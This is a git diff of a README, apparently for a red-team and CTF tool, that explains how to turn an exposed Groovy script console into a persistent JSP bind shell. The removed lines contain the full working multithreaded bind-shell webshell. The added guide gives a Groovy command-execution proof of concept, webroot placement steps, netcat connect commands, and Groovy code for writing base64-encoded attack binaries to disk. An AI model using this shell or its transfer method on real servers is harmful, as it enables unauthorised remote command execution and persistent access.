@@ -1,19 +1,37 @@
-# Bind Shell From Groovy Script Console
-a script to write JSP webshells and execute them via the web root. useful for engagements with jenkins\liferay where you don't have the ability to abuse legitimate upload functionalities in platforms such as liferay/jenkins but  script console is enabled and the network firewall is blocking outgoing traffic.
-Built for Offensive security tasks and CTF junkies who hate fragile shells.
 
-#### Info
-This Groovy script generates a JSP bind shell that supports multithreading.
-If you hit CTRL+C or lose the connection, you can simply reconnect.
-By default, it listens on port 3001, but you can change that anytime.
+# __OVERVIEW
+Have you ever been in an engagement or CTF where you finally find a Groovy script console… and then discover outbound connections are blocked? or you can't get tools to the target using built in upload methods?
+view detailed writeup in [this blog post](https://vipa0z.github.io/2025/10/22/Remote%20Code%20Execution%20in%20liferay-jenkins/)
+Over the next few minutes I’ll show a practical, repeatable approach for turning a Groovy console into a persistent, multithreaded JSP bind shell that lives in the webroot and how to transfer binary tools via base64 encoding (small and large size). this guide serves as a proof of concept, the shell in here is not secure enough for opsec, but it’s a starting point for you to build upon.
+<!-- more -->
+---
+### Quick Referesher on bind shells:
+<img width="960" height="482" alt="image" src="https://github.com/user-attachments/assets/b18306c4-3d81-4f7d-b935-845937d1ce31" />
+The top side shows a bind shell: the victim host runs a listener (a shell bound to a TCP port) and the attacker connects into that listener to gain interactive access. The bottom side shows a reverse shell: the attacker runs the listener and the victim initiates an outbound connection back to the attacker, delivering a shell to the attacker's listener.
 
-#### How to use
-0. browse to the groovy script console GUI
-2. Figure out where the web root is (tomcat root), this can be performed with `pwd`,`ls`,`dir`
+Reverse shells are the go-to for many red-teamers because they slip out through egress and work around NAT. But when outgoing traffic is tightly restricted (egress-blocked/proxied), you need a plan B. that’s when I focus on bind shells. In short: a bind shell makes the target listen and waits for an inbound connection. It trades the egress dependency of a reverse shell for a requirement that you can reach the host inbound (or via a pivot you control). That trade can be exactly what you need when defenders have locked down outbound channels.
 
-here are some known remote  command executin scripts:
-1. POC for simple commands: `pwd`,`ls`,`dir` `cd` ( use to figure out where the web root is)
-```
+
+-----
+
+### Groovy Console to Bind Shell:
+<img width="600" height="413" alt="image" src="https://github.com/user-attachments/assets/f0ab045d-7531-4913-9a86-7e2e03994240" />
+When your RCE is limited to a Groovy-style script console (Jenkins, Liferay, etc.) and the target cannot reach back to you, the console itself becomes your primary file-system and transfer channel. This post focuses on turning that console access into a stable way to read/write files, drop tools, and stage post-exploit activities — not on fancy in-memory shells. Treat the console like a tiny development environment on the target: you can list folders, create files, and write binary blobs (via base64) into disk locations the web server will execute or serve.
+
+---
+
+### Deploying the bind shell:
+
+high level steps:
+
+1. Discover writable paths (where you can save files that persist and potentially get executed or served).
+2. Transfer binary tools via base64/text encoding and write them as raw bytes on disk.
+3. Verify permissions & execute (browse to webshell to load your bind shell).
+4. Clean up and document detection artifacts.
+
+### Simple OS commands POC:
+POC script for running simple commands such as  `pwd, ls, dir, cd`  and trying to identify where the web root might be located:
+```groovy
 def cmd="YOURCOMMAND-dir"
 def sout = new StringBuilder(), serr = new StringBuilder()
 def proc = cmd.execute()
@@ -22,98 +40,98 @@ proc.waitForOrKill(1000)
 println "out> $sout err> $serr"
 ```
 
-this is where your bind shell will live, if you execute it correctly then you will be able to aceess the shell at `site\threaded.jsp`
+### 1) Finding stable, writable locations
 
-paste the following into your groovy console:
+From the console, run simple listing commands to map the filesystem and locate likely writable paths:
+
+```terminal
+Linux: pwd, ls -la, id, whoami, env
+
+Windows: dir, whoami, echo %USERPROFILE%
 ```
-new File("<PATHTOTOMCAT>/tomcat/ROOT/threaded.jsp").text ='''<%@ page import="java.io.*" %>
-<%@ page import="java.net.*" %>
-<%!
-    // Static block to ensure the listener thread is only started once.
-    static {
-        new Thread(new Runnable() {
-            public void run() {
-                // --- CONFIGURATION ---
-                int port = 3001; // The port to listen on.
-                // -------------------
+Typical candidate locations:
 
-                try {
-                    ServerSocket serverSocket = new ServerSocket(port);
-                    // This is the key change: an infinite loop to accept multiple clients.
-                    while (true) {
-                        // Wait for a client to connect. This call blocks until a connection is made.
-                        Socket clientSocket = serverSocket.accept();
-                        
-                        // When a client connects, create a NEW THREAD to handle them.
-                        // This allows the main loop to go back and wait for the next client.
-                        new Thread(new ClientHandler(clientSocket)).start();
-                    }
-                } catch (Exception e) {
-                    // Fail silently in the background.
-                }
-            }
-        }).start();
-    }
+- Application webroot (e.g., `<TOMCAT_HOME>/webapps/ROOT`) — files here can often be triggered by HTTP requests.
+- Upload or config directories used by the application.
 
-    // This class handles the logic for a single connected client.
-    static class ClientHandler implements Runnable {
-        private final Socket clientSocket;
+This is where my bind shell comes into play: https://raw.githubusercontent.com/vipa0z/Groovy-bind-shell/refs/heads/main/persistent_bind_shell.java. Use this link to access the code. I recommend reviewing it first, but you can also paste it into your Groovy console after updating the output path to match your Tomcat webroot.
 
-        ClientHandler(Socket socket) {
-            this.clientSocket = socket;
-        }
 
-        public void run() {
-            try {
-                String shell = System.getProperty("os.name").toLowerCase().startsWith("windows") ? "cmd.exe" : "/bin/sh";
-                Process process = Runtime.getRuntime().exec(shell);
+Hit save, then to enable the listener, browse to your webshell at: http://site/threaded.jsp
 
-                // Redirect I/O for this specific client
-                new Thread(new StreamRedirector(process.getInputStream(), clientSocket.getOutputStream())).start();
-                new Thread(new StreamRedirector(process.getErrorStream(), clientSocket.getOutputStream())).start();
-                new Thread(new StreamRedirector(clientSocket.getInputStream(), process.getOutputStream())).start();
-
-                process.waitFor();
-            } catch (Exception e) {
-                // An exception here usually means the client disconnected.
-            } finally {
-                try { clientSocket.close(); } catch (IOException e) {}
-            }
-        }
-    }
-
-    // Helper class to redirect streams. No changes needed here.
-    static class StreamRedirector implements Runnable {
-        private final InputStream in;
-        private final OutputStream out;
-        StreamRedirector(InputStream in, OutputStream out) { this.in = in; this.out = out; }
-        public void run() {
-            try {
-                byte[] buffer = new byte[4096];
-                int bytesRead;
-                while ((bytesRead = in.read(buffer)) != -1) {
-                    out.write(buffer, 0, bytesRead);
-                    out.flush();
-                }
-            } catch (IOException e) {}
-        }
-    }
-%>
-<html>
-<body>
-    <h1>Persistent Bind Shell Initialized</h1>
-    <p>A persistent listener should now be active on port <strong>3001</strong>.</p>
-</body>
-</html>
-'''
+Connect to the bind shell via netcat:
 ```
-3. edit the location to save the shell to the correct webroot location
-4. hit save and browse to your webshell so it activates `http://site/threaded.jsp`
-5. connect to the bind shell via netcat:
-```
- example 1:
+example 1:
 rlwrap -cAr nc -nv HOST-IP 3001
 
 example 2:
-rlwrap -cAr nc -nv 172.16.30.10  3001
+rlwrap -cAr nc -nv 172.16.30.10 3001
 ```
+
+Tips:
+
+- Prefer non-volatile locations that survive process reloads if you need longer-lived access (webroot > in-memory-only artefacts).
+- Check file ownership and mode (ls -la) to avoid placing files you can’t later run or overwrite.
+- If multiple app instances exist (e.g., separate webapps), target the one whose webroot is public-facing.
+
+
+#### 2) Tool transfers using the groovy script console:
+if for some reason you are not able to abuse built in upload functionality to have tools into the file system, you can use the groovy script console to read and covert tools that are base64 encoded  with this console script:
+
+note: this will not work if your base64 is more than 6000 in length, you can use the chunking method below to transfer large base64 strings.
+
+for smaller sized tools (eg: netcat, potato exploits..etc):
+
+base64 encode the tool and copy to clipboard:
+
+```
+base64 --wrap=0 tool.exe | xclip -selection clipboard -i
+```
+paste the base64 into the console
+
+```groovy
+import java.util.Base64
+import java.nio.file.Files
+import java.nio.file.Paths
+import java.nio.charset.StandardCharsets
+
+def b64 = '''<LONG BASE64 STRING>'''
+def dest = Paths.get("C:/DESTPATH/xyz")
+byte[] bytes = Base64.getDecoder().decode(b64)
+Files.write(dest, bytes)
+println "Wrote ${bytes.length} bytes to ${dest}"
+```
+
+for larger binaries: i created the script below to chunk your tools into smaller base64 files with each file containing a variable with 6000 characters. that can then be pasted into the console and later combined by groovy.
+https://raw.githubusercontent.com/vipa0z/Groovy-bind-shell/refs/heads/main/tool_chunker.py
+
+base64 encode your tools, run the python script and copy the output to the clipboard:
+```shell
+python3 tool_chunker.py yourtool.exe -o <output_dir> -s 6000
+```
+`-s`: size of each chunk
+`-o`: output directory
+`-h`: help
+the script will save the chunks in the output directory with the format `part1`, `part2`, etc.
+the script has instructions on what to do next:
+example usage:
+```
+ python3 tool_chunker.py -s 6000 XecretsEz  -o xcretsez 
+```
+<img width="819" height="261" alt="image" src="https://github.com/user-attachments/assets/f5e1bf7f-6916-4ca2-bdf5-de0d7caa424b" />
+
+2. browse to the output directory and run cat + copy to clipboard
+
+3.paste your clipboard content into the script console
+
+4. go back to `tool_chunker.py` output and copy the groovy POC  to your console under the base64 blobs.
+5. ensure the write path is correct
+6. hit save and pray it works
+
+#### Reliable verification & simple sanity checks
+
+After dropping:
+- Check size and checksum: read file bytes and print length or MD5 Hash to verify it was transfered correctly.
+
+That’s a wrap. Quick checklist before you go:  find writable paths, use base64 or chunked base64, verify integrity, and delete artifacts when finished.
+Thanks for reading.
